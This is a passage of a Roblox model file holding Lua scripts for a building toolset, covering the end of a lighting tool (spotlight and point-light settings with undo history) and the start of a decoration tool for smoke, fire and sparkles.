			self:changeSide( Enum.NormalId.Top );
		end );
		SideDropdown:addOption( "BOTTOM" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Bottom );
		end );
		SideDropdown:addOption( "FRONT" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Front );
		end );
		SideDropdown:addOption( "BACK" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Back );
		end );
		SideDropdown:addOption( "LEFT" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Left );
		end );
		SideDropdown:addOption( "RIGHT" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Right );
		end );

		-- Add functionality to spotlight inputs
		local SpotlightUI = Container.Spotlight;

		local SLColor = SpotlightUI.Options.ColorOption;
		SLColor.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.sl_color_r_focused = true;
			SLColor.RInput.TextBox:CaptureFocus();
		end );
		SLColor.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SLColor.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeColor( 'spotlight', 'r', potential_new / 255 );
			end;
			self.State.sl_color_r_focused = false;
		end );
		SLColor.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.sl_color_g_focused = true;
			SLColor.GInput.TextBox:CaptureFocus();
		end );
		SLColor.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SLColor.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeColor( 'spotlight', 'g', potential_new / 255 );
			end;
			self.State.sl_color_g_focused = false;
		end );
		SLColor.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.sl_color_b_focused = true;
			SLColor.BInput.TextBox:CaptureFocus();
		end );
		SLColor.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SLColor.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeColor( 'spotlight', 'b', potential_new / 255 );
			end;
			self.State.sl_color_b_focused = false;
		end );

		SLColor.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the spotlights' color
				-- to the selected color
				if #args == 3 then
					self:changeColor( 'spotlight', _HSVToRGB( ... ) );
				end;
			end, self.State.sl_color );
		end );

		local SLBrightness = SpotlightUI.Options.BrightnessOption.Input;
		SLBrightness.TextButton.MouseButton1Down:connect( function ()
			self.State.sl_brightness_focused = true;
			SLBrightness.TextBox:CaptureFocus();
		end );
		SLBrightness.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SLBrightness.TextBox.Text );
			if potential_new then
				if potential_new > 5 then
					potential_new = 5;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeBrightness( 'spotlight', potential_new );
			end;
			self.State.sl_brightness_focused = false;
		end );

		local SLAngle = SpotlightUI.Options.AngleOption.Input;
		SLAngle.TextButton.MouseButton1Down:connect( function ()
			self.State.sl_angle_focused = true;
			SLAngle.TextBox:CaptureFocus();
		end );
		SLAngle.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SLAngle.TextBox.Text );
			if potential_new then
				self:changeAngle( potential_new );
			end;
			self.State.sl_angle_focused = false;
		end );

		local SLRange = SpotlightUI.Options.RangeOption.Input;
		SLRange.TextButton.MouseButton1Down:connect( function ()
			self.State.sl_range_focused = true;
			SLRange.TextBox:CaptureFocus();
		end );
		SLRange.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SLRange.TextBox.Text );
			if potential_new then
				if potential_new > 60 then
					potential_new = 60;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeRange( 'spotlight', potential_new );
			end;
			self.State.sl_range_focused = false;
		end );

		local SLShadows = SpotlightUI.Options.ShadowsOption;
		SLShadows.On.Button.MouseButton1Down:connect( function ()
			self:changeShadows( 'spotlight', true );
		end );
		SLShadows.Off.Button.MouseButton1Down:connect( function ()
			self:changeShadows( 'spotlight', false );
		end );

		-- Add functionality to point light inputs
		local PointLightUI = Container.PointLight;

		local PLColor = PointLightUI.Options.ColorOption;
		PLColor.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.pl_color_r_focused = true;
			PLColor.RInput.TextBox:CaptureFocus();
		end );
		PLColor.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( PLColor.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeColor( 'pointlight', 'r', potential_new / 255 );
			end;
			self.State.pl_color_r_focused = false;
		end );
		PLColor.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.pl_color_g_focused = true;
			PLColor.GInput.TextBox:CaptureFocus();
		end );
		PLColor.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( PLColor.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeColor( 'pointlight', 'g', potential_new / 255 );
			end;
			self.State.pl_color_g_focused = false;
		end );
		PLColor.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.pl_color_b_focused = true;
			PLColor.BInput.TextBox:CaptureFocus();
		end );
		PLColor.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( PLColor.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeColor( 'pointlight', 'b', potential_new / 255 );
			end;
			self.State.pl_color_b_focused = false;
		end );

		PLColor.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the point lights' color
				-- to the selected color
				if #args == 3 then
					self:changeColor( 'pointlight', _HSVToRGB( ... ) );
				end;
			end, self.State.pl_color );
		end );

		local PLBrightness = PointLightUI.Options.BrightnessOption.Input;
		PLBrightness.TextButton.MouseButton1Down:connect( function ()
			self.State.pl_brightness_focused = true;
			PLBrightness.TextBox:CaptureFocus();
		end );
		PLBrightness.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( PLBrightness.TextBox.Text );
			if potential_new then
				if potential_new > 5 then
					potential_new = 5;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeBrightness( 'pointlight', potential_new );
			end;
			self.State.pl_brightness_focused = false;
		end );

		local PLRange = PointLightUI.Options.RangeOption.Input;
		PLRange.TextButton.MouseButton1Down:connect( function ()
			self.State.pl_range_focused = true;
			PLRange.TextBox:CaptureFocus();
		end );
		PLRange.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( PLRange.TextBox.Text );
			if potential_new then
				if potential_new > 60 then
					potential_new = 60;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeRange( 'pointlight', potential_new );
			end;
			self.State.pl_range_focused = false;
		end );

		local PLShadows = PointLightUI.Options.ShadowsOption;
		PLShadows.On.Button.MouseButton1Down:connect( function ()
			self:changeShadows( 'pointlight', true );
		end );
		PLShadows.Off.Button.MouseButton1Down:connect( function ()
			self:changeShadows( 'pointlight', false );
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Lighting.changeSide = function ( self, side )

	local lights = self:getSpotlights();

	self:startHistoryRecord( lights );
	for _, Light in pairs( lights ) do
		Light.Face = side;
	end;
	self:finishHistoryRecord();

	if self.SideDropdown.open then
		self.SideDropdown:toggle();
	end;

end;

Tools.Lighting.changeAngle = function ( self, angle )

	local lights = self:getSpotlights();

	self:startHistoryRecord( lights );
	for _, Light in pairs( lights ) do
		Light.Angle = angle;
	end;
	self:finishHistoryRecord();

end;

Tools.Lighting.getSpotlights = function ( self )
	-- Returns a list of all the relevant spotlights in the selection items

	local spotlights = {};

	for _, Item in pairs( Selection.Items ) do
		local Spotlight = _getChildOfClass( Item, 'SpotLight' );
		if Spotlight then
			table.insert( spotlights, Spotlight );
		end;
	end;

	return spotlights;

end;

Tools.Lighting.getPointLights = function ( self )
	-- Returns a list of all the relevant point lights in the selection items

	local pointlights = {};

	for _, Item in pairs( Selection.Items ) do
		local PointLight = _getChildOfClass( Item, 'PointLight' );
		if PointLight then
			table.insert( pointlights, PointLight );
		end;
	end;

	return pointlights;

end;

Tools.Lighting.changeColor = function ( self, target, ... )

	local args = { ... };
	local targets;

	if target == 'spotlight' then
		targets = self:getSpotlights();
	elseif target == 'pointlight' then
		targets = self:getPointLights();
	end;

	self:startHistoryRecord( targets );

	-- If only one component is being changed at a time
	if #args == 2 then
		local component = args[1];
		local component_value = args[2];

		for _, Light in pairs( targets ) do
			Light.Color = Color3.new(
				component == 'r' and component_value or Light.Color.r,
				component == 'g' and component_value or Light.Color.g,
				component == 'b' and component_value or Light.Color.b
			);
		end;

	-- If all 3 components of the color are being changed
	elseif #args == 3 then
		local r, g, b = ...;

		for _, Light in pairs( targets ) do
			Light.Color = Color3.new( r, g, b );
		end;
	end;

	self:finishHistoryRecord();
end;

Tools.Lighting.changeBrightness = function ( self, target, new_brightness )

	local targets;

	if target == 'spotlight' then
		targets = self:getSpotlights();
	elseif target == 'pointlight' then
		targets = self:getPointLights();
	end;

	self:startHistoryRecord( targets );

	for _, Light in pairs( targets ) do
		Light.Brightness = new_brightness;
	end;

	self:finishHistoryRecord();

end;

Tools.Lighting.changeRange = function ( self, target, new_range )

	local targets;

	if target == 'spotlight' then
		targets = self:getSpotlights();
	elseif target == 'pointlight' then
		targets = self:getPointLights();
	end;

	self:startHistoryRecord( targets );

	for _, Light in pairs( targets ) do
		Light.Range = new_range;
	end;

	self:finishHistoryRecord();

end;

Tools.Lighting.changeShadows = function ( self, target, new_shadows )

	local targets;

	if target == 'spotlight' then
		targets = self:getSpotlights();
	elseif target == 'pointlight' then
		targets = self:getPointLights();
	end;

	self:startHistoryRecord( targets );

	for _, Light in pairs( targets ) do
		Light.Shadows = new_shadows;
	end;

	self:finishHistoryRecord();

end;

Tools.Lighting.addLight = function ( self, light_type )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Light in pairs( self.lights ) do
				Light.Parent = self.light_parents[Light];
				Selection:add( Light.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Light in pairs( self.lights ) do
				Selection:add( Light.Parent );
				Light.Parent = nil;
			end;
		end;
	};

	-- Add lights to all the items from the selection that
	-- don't already have one
	local lights = {};
	local light_parents = {};
	for _, Item in pairs( Selection.Items ) do
		local Light = _getChildOfClass( Item, light_type );
		if not Light then
			local Light = RbxUtility.Create( light_type ) {
				Parent = Item;
			};
			table.insert( lights, Light );
			light_parents[Light] = Item;
		end;
	end;

	HistoryRecord.lights = lights;
	HistoryRecord.light_parents = light_parents;
	History:add( HistoryRecord );

end;

Tools.Lighting.removeLight = function ( self, light_type )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Light in pairs( self.lights ) do
				Selection:add( Light.Parent );
				Light.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Light in pairs( self.lights ) do
				Light.Parent = self.light_parents[Light];
				Selection:add( Light.Parent );
			end;
		end;
	};

	local lights = {};
	local light_parents = {};

	-- Remove lights from all the selected items
	local lights;
	if light_type == 'spotlight' then
		lights = self:getSpotlights();
	elseif light_type == 'pointlight' then
		lights = self:getPointLights();
	end;

	for _, Light in pairs( lights ) do
		light_parents[Light] = Light.Parent;
		Light.Parent = nil;
	end;

	HistoryRecord.lights = lights;
	HistoryRecord.light_parents = light_parents;
	History:add( HistoryRecord );

end;

Tools.Lighting.startHistoryRecord = function ( self, lights )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( lights );
		initial_color = {};			terminal_color = {};
		initial_brightness = {};	terminal_brightness = {};
		initial_range = {};			terminal_range = {};
		initial_shadows = {};		terminal_shadows = {};
		-- Spotlights only
		initial_side = {};			terminal_side = {};
		initial_angle = {};			terminal_angle = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					Target.Color = self.initial_color[Target];
					Target.Brightness = self.initial_brightness[Target];
					Target.Range = self.initial_range[Target];
					Target.Shadows = self.initial_shadows[Target];
					if Target:IsA( 'SpotLight' ) then
						Target.Face = self.initial_side[Target];
						Target.Angle = self.initial_angle[Target];
					end;
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					Target.Color = self.terminal_color[Target];
					Target.Brightness = self.terminal_brightness[Target];
					Target.Range = self.terminal_range[Target];
					Target.Shadows = self.terminal_shadows[Target];
					if Target:IsA( 'SpotLight' ) then
						Target.Face = self.terminal_side[Target];
						Target.Angle = self.terminal_angle[Target];
					end;
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_color[Item] = Item.Color;
			self.State.HistoryRecord.initial_brightness[Item] = Item.Brightness;
			self.State.HistoryRecord.initial_range[Item] = Item.Range;
			self.State.HistoryRecord.initial_shadows[Item] = Item.Shadows;
			if Item:IsA( 'SpotLight' ) then
				self.State.HistoryRecord.initial_side[Item] = Item.Face;
				self.State.HistoryRecord.initial_angle[Item] = Item.Angle;
			end;
		end;
	end;

end;

Tools.Lighting.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_color[Item] = Item.Color;
			self.State.HistoryRecord.terminal_brightness[Item] = Item.Brightness;
			self.State.HistoryRecord.terminal_range[Item] = Item.Range;
			self.State.HistoryRecord.terminal_shadows[Item] = Item.Shadows;
			if Item:IsA( 'SpotLight' ) then
				self.State.HistoryRecord.terminal_side[Item] = Item.Face;
				self.State.HistoryRecord.terminal_angle[Item] = Item.Angle;
			end;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Lighting.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Lighting.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBXA8EB10BD15B949FB81F1658813FFDC13">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTDecorateTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Decorate tool
------------------------------------------

-- Create the tool
Tools.Decorate = {};

-- Define the tool's color
Tools.Decorate.Color = BrickColor.new( "Really black" );

-- Keep a container for state data
Tools.Decorate.State = {};

-- Keep a container for temporary connections
Tools.Decorate.Connections = {};

-- Keep a container for platform event connections
Tools.Decorate.Listeners = {};

-- Start adding functionality to the tool
Tools.Decorate.Listeners.Equipped = function ()

	local self = Tools.Decorate;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Decorate.Listeners.Unequipped = function ()

	local self = Tools.Decorate;

	-- Stop the GUI updater
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Decorate.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	-- If there are items, display the regular interface
	if #Selection.Items > 0 then
		local smoke = self:getSmoke();
		local fire = self:getFire();
		local sparkles = self:getSparkles();

		-- Get the properties of the decorations
		local smoke_color_r, smoke_color_g, smoke_color_b, smoke_opacity, smoke_velocity, smoke_size;
		local fire_color_r, fire_color_g, fire_color_b, fire_2nd_color_r, fire_2nd_color_g, fire_2nd_color_b, fire_heat, fire_size;
		local sparkles_color_r, sparkles_color_g, sparkles_color_b;

		for smoke_index, Smoke in pairs( smoke ) do
			-- Set the initial values for later comparison
			if smoke_index == 1 then
				smoke_color_r, smoke_color_g, smoke_color_b = Smoke.Color.r, Smoke.Color.g, Smoke.Color.b;
				smoke_opacity = Smoke.Opacity;
				smoke_velocity = Smoke.RiseVelocity;
				smoke_size = Smoke.Size;
			-- Set the values to `nil` if they vary across the selection
			else
				if smoke_color_r ~= Smoke.Color.r then
					smoke_color_r = nil;
				end;
				if smoke_color_g ~= Smoke.Color.g then
					smoke_color_g = nil;
				end;
				if smoke_color_b ~= Smoke.Color.b then
					smoke_color_b = nil;
				end;
				if smoke_opacity ~= Smoke.Opacity then
					smoke_opacity = nil;
				end;
				if smoke_velocity ~= Smoke.RiseVelocity then
					smoke_velocity = nil;
				end;
				if smoke_size ~= Smoke.Size then
					smoke_size = nil;
				end;
			end;
		end;

		for fire_index, Fire in pairs( fire ) do
			if fire_index == 1 then
				fire_color_r, fire_color_g, fire_color_b = Fire.Color.r, Fire.Color.g, Fire.Color.b;
				fire_2nd_color_r, fire_2nd_color_g, fire_2nd_color_b = Fire.SecondaryColor.r, Fire.SecondaryColor.g, Fire.SecondaryColor.b;
				fire_heat = Fire.Heat;
				fire_size = Fire.Size;
			else
				if fire_color_r ~= Fire.Color.r then
					fire_color_r = nil;
				end;
				if fire_color_g ~= Fire.Color.g then
					fire_color_g = nil;
				end;
				if fire_color_b ~= Fire.Color.b then
					fire_color_b = nil;
				end;
				if fire_2nd_color_r ~= Fire.SecondaryColor.r then
					fire_2nd_color_r = nil;
				end;
				if fire_2nd_color_g ~= Fire.SecondaryColor.g then
					fire_2nd_color_g = nil;
				end;
				if fire_2nd_color_b ~= Fire.SecondaryColor.b then
					fire_2nd_color_b = nil;
				end;
				if fire_heat ~= Fire.Heat then
					fire_heat = nil;
				end;
				if fire_size ~= Fire.Size then
					fire_size = nil;
				end;
			end;
		end;

		for sparkles_index, Sparkles in pairs( sparkles ) do
			if sparkles_index == 1 then
				sparkles_color_r, sparkles_color_g, sparkles_color_b = Sparkles.SparkleColor.r, Sparkles.SparkleColor.g, Sparkles.SparkleColor.b;
			else
				if sparkles_color_r ~= Sparkles.SparkleColor.r then
					sparkles_color_r = nil;
				end;
				if sparkles_color_g ~= Sparkles.SparkleColor.g then
					sparkles_color_g = nil;
				end;
				if sparkles_color_b ~= Sparkles.SparkleColor.b then
					sparkles_color_b = nil;
				end;
			end;
		end;

		self.State.smoke_color = ( smoke_color_r and smoke_color_g and smoke_color_b ) and Color3.new( smoke_color_r, smoke_color_g, smoke_color_b ) or nil;
		self.State.fire_color = ( fire_color_r and fire_color_g and fire_color_b ) and Color3.new( fire_color_r, fire_color_g, fire_color_b ) or nil;
		self.State.fire_2nd_color = ( fire_2nd_color_r and fire_2nd_color_g and fire_2nd_color_b ) and Color3.new( fire_2nd_color_r, fire_2nd_color_g, fire_2nd_color_b ) or nil;
		self.State.sparkles_color = ( sparkles_color_r and sparkles_color_g and sparkles_color_b ) and Color3.new( sparkles_color_r, sparkles_color_g, sparkles_color_b ) or nil;

		-- Update the smoke GUI data
		if not self.State.smoke_color_r_focused then
			self.GUI.Smoke.Options.ColorOption.RInput.TextBox.Text = smoke_color_r and _round( smoke_color_r * 255, 0 ) or '*';
		end;
		if not self.State.smoke_color_g_focused then
			self.GUI.Smoke.Options.ColorOption.GInput.TextBox.Text = smoke_color_g and _round( smoke_color_g * 255, 0 ) or '*';
		end;
		if not self.State.smoke_color_b_focused then
			self.GUI.Smoke.Options.ColorOption.BInput.TextBox.Text = smoke_color_b and _round( smoke_color_b * 255, 0 ) or '*';
		end;
		if not self.State.smoke_opacity_focused then
			self.GUI.Smoke.Options.OpacityOption.Input.TextBox.Text = smoke_opacity and _round( smoke_opacity, 2 ) or '*';
		end;
		if not self.State.smoke_velocity_focused then
			self.GUI.Smoke.Options.VelocityOption.Input.TextBox.Text = smoke_velocity and _round( smoke_velocity, 2 ) or '*';
		end;
		if not self.State.smoke_size_focused then
			self.GUI.Smoke.Options.SizeOption.Input.TextBox.Text = smoke_size and _round( smoke_size, 2 ) or '*';
		end;

		-- Update the fire GUI data
		if not self.State.fire_color_r_focused then
			self.GUI.Fire.Options.ColorOption.RInput.TextBox.Text = fire_color_r and _round( fire_color_r * 255, 0 ) or '*';
		end;
		if not self.State.fire_color_g_focused then
			self.GUI.Fire.Options.ColorOption.GInput.TextBox.Text = fire_color_g and _round( fire_color_g * 255, 0 ) or '*';
		end;
		if not self.State.fire_color_b_focused then
			self.GUI.Fire.Options.ColorOption.BInput.TextBox.Text = fire_color_b and _round( fire_color_b * 255, 0 ) or '*';
		end;
		if not self.State.fire_2nd_color_r_focused then
			self.GUI.Fire.Options.SecondColorOption.RInput.TextBox.Text = fire_2nd_color_r and _round( fire_2nd_color_r * 255, 0 ) or '*';
		end;
		if not self.State.fire_2nd_color_g_focused then
			self.GUI.Fire.Options.SecondColorOption.GInput.TextBox.Text = fire_2nd_color_g and _round( fire_2nd_color_g * 255, 0 ) or '*';
		end;
		if not self.State.fire_2nd_color_b_focused then
			self.GUI.Fire.Options.SecondColorOption.BInput.TextBox.Text = fire_2nd_color_b and _round( fire_2nd_color_b * 255, 0 ) or '*';
		end;
		if not self.State.fire_heat_focused then
			self.GUI.Fire.Options.HeatOption.Input.TextBox.Text = fire_heat and _round( fire_heat, 2 ) or '*';
		end;
		if not self.State.fire_size_focused then
			self.GUI.Fire.Options.SizeOption.Input.TextBox.Text = fire_size and _round( fire_size, 2 ) or '*';
		end;

		-- Update the sparkles GUI data
		if not self.State.sparkles_color_r_focused then
			self.GUI.Sparkles.Options.ColorOption.RInput.TextBox.Text = sparkles_color_r and _round( sparkles_color_r * 255, 0 ) or '*';
		end;
		if not self.State.sparkles_color_g_focused then
			self.GUI.Sparkles.Options.ColorOption.GInput.TextBox.Text = sparkles_color_g and _round( sparkles_color_g * 255, 0 ) or '*';
		end;
		if not self.State.sparkles_color_b_focused then
			self.GUI.Sparkles.Options.ColorOption.BInput.TextBox.Text = sparkles_color_b and _round( sparkles_color_b * 255, 0 ) or '*';
		end;

		if self.GUI.SelectNote.Visible then
			self:closeSmoke();
			self:closeFire();
			self:closeSparkles();
		end;
		self.GUI.Smoke.Visible = true;
		self.GUI.Fire.Visible = true;
		self.GUI.Sparkles.Visible = true;
		self.GUI.SelectNote.Visible = false;

		if not self.State.smoke_open and not self.State.fire_open and not self.State.sparkles_open then
			self.GUI:TweenSize( UDim2.new( 0, 200, 0, 125 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
		end;

		-- If there is no smoke
		if #smoke == 0 then
			self.GUI.Smoke.Options.Size = UDim2.new( 1, -3, 0, 0 );
			self.GUI.Smoke.AddButton.Visible = true;
			self.GUI.Smoke.RemoveButton.Visible = false;
			if self.State.smoke_open then
				self:closeSmoke();
			end;

		-- If only some items have smoke
		elseif #smoke ~= #Selection.Items then
			self.GUI.Smoke.AddButton.Visible = true;
			self.GUI.Smoke.RemoveButton.Position = UDim2.new( 0, 90, 0, 3 );
			self.GUI.Smoke.RemoveButton.Visible = true;

		-- If all items have smoke
		elseif #smoke == #Selection.Items then
			self.GUI.Smoke.AddButton.Visible = false;
			self.GUI.Smoke.RemoveButton.Position = UDim2.new( 0, 127, 0, 3 );
			self.GUI.Smoke.RemoveButton.Visible = true;
			if self.GUI.Smoke.Size == UDim2.new( 0, 200, 0, 52 ) then
				self.GUI.Smoke.Size = UDim2.new( 0, 200, 0, 125 );
			end;
		end;

		-- If there is no fire
		if #fire == 0 then
			self.GUI.Fire.Options.Size = UDim2.new( 1, -3, 0, 0 );
			self.GUI.Fire.AddButton.Visible = true;
			self.GUI.Fire.RemoveButton.Visible = false;
			if self.State.fire_open then
				self:closeFire();
			end;

		-- If only some items have fire
		elseif #fire ~= #Selection.Items then
			self.GUI.Fire.AddButton.Visible = true;
			self.GUI.Fire.RemoveButton.Position = UDim2.new( 0, 90, 0, 3 );
			self.GUI.Fire.RemoveButton.Visible = true;

		-- If all items have fire
		elseif #fire == #Selection.Items then
			self.GUI.Fire.AddButton.Visible = false;
			self.GUI.Fire.RemoveButton.Position = UDim2.new( 0, 127, 0, 3 );
			self.GUI.Fire.RemoveButton.Visible = true;
		end;

		-- If there are no sparkles
		if #sparkles == 0 then
			self.GUI.Sparkles.Options.Size = UDim2.new( 1, -3, 0, 0 );
			self.GUI.Sparkles.AddButton.Visible = true;
			self.GUI.Sparkles.RemoveButton.Visible = false;
			if self.State.sparkles_open then
				self:closeSparkles();
			end;

		-- If only some items have sparkles
		elseif #sparkles ~= #Selection.Items then
			self.GUI.Sparkles.AddButton.Visible = true;
			self.GUI.Sparkles.RemoveButton.Position = UDim2.new( 0, 90, 0, 3 );
			self.GUI.Sparkles.RemoveButton.Visible = true;

		-- If all items have sparkles
		elseif #sparkles == #Selection.Items then
			self.GUI.Sparkles.AddButton.Visible = false;
			self.GUI.Sparkles.RemoveButton.Position = UDim2.new( 0, 127, 0, 3 );
			self.GUI.Sparkles.RemoveButton.Visible = true;
		end;

	-- If nothing is selected, show the select something note
	else
		self.GUI.Smoke.Visible = false;
		self.GUI.Fire.Visible = false;
		self.GUI.Sparkles.Visible = false;
		self.GUI.SelectNote.Visible = true;
		self.GUI.Size = UDim2.new( 0, 200, 0, 52 );
	end;

end;

Tools.Decorate.openSmoke = function ( self )
	self.State.smoke_open = true;
	self:closeFire();
	self:closeSparkles();
	self.GUI.Smoke.Options:TweenSize( UDim2.new( 1, -3, 0, 110 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.Smoke:TweenPosition( UDim2.new( 0, 10, 0, 30 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI:TweenSize( UDim2.new( 0, 200, 0, 235 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
end;

Tools.Decorate.openFire = function ( self )
	self.State.fire_open = true;
	self:closeSmoke();
	self:closeSparkles();
	self.GUI.Fire.Options:TweenSize( UDim2.new( 1, -3, 0, 110 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.Fire:TweenPosition( UDim2.new( 0, 10, 0, 60 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI:TweenSize( UDim2.new( 0, 200, 0, 235 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
end;

Tools.Decorate.openSparkles = function ( self )
	self.State.sparkles_open = true;
	self:closeSmoke();
	self:closeFire();
	self.GUI.Sparkles.Options:TweenSize( UDim2.new( 1, -3, 0, 40 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.Sparkles:TweenPosition( UDim2.new( 0, 10, 0, 90 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI:TweenSize( UDim2.new( 0, 200, 0, 160 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
end;

Tools.Decorate.closeSmoke = function ( self )
	self.State.smoke_open = false;
	self.GUI.Smoke.Options:TweenSize( UDim2.new( 1, -3, 0, 0 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.Fire:TweenPosition( UDim2.new( 0, 10, 0, 60 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	if not self.State.fire_open then
		self.GUI.Sparkles:TweenPosition( UDim2.new( 0, 10, 0, 90 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
	if not self.State.fire_open and not self.State.sparkles_open then
		self.GUI:TweenSize( UDim2.new( 0, 200, 0, 125 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
end;

Tools.Decorate.closeFire = function ( self )
	self.State.fire_open = false;
	if self.State.smoke_open then
		self.GUI.Fire:TweenPosition( UDim2.new( 0, 10, 0, 170 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	else
		self.GUI.Fire:TweenPosition( UDim2.new( 0, 10, 0, 60 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
	self.GUI.Fire.Options:TweenSize( UDim2.new( 1, -3, 0, 0 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	if not self.State.smoke_open then
